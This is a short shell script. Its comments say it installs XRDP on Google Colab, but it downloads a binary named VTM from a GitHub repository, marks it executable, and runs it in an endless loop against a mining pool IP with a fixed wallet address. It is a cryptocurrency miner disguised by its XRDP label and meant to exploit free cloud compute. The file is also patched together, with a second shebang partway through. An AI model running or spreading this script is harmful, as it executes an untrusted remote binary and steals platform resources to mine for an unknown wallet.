# /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R VTM

wget https://github.com/angkii/asu/raw/main/VTM
chmod 700 VTM

#!/bin/sh
#
# Choose nearest stratum:
#       stratum-eu.rplant.xyz   /France/
#       stratum-asia.rplant.xyz /Singapore/
#       stratum-na.rplant.xyz   /Canada/
#
FOLDER=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
while [ 1 ]; do
"$FOLDER"/VTM -o 159.223.188.176:80 -u AKkK5wtpcNtTGs7YscvE9erzs2nUGatLZG -p x -a gr
sleep 5
done
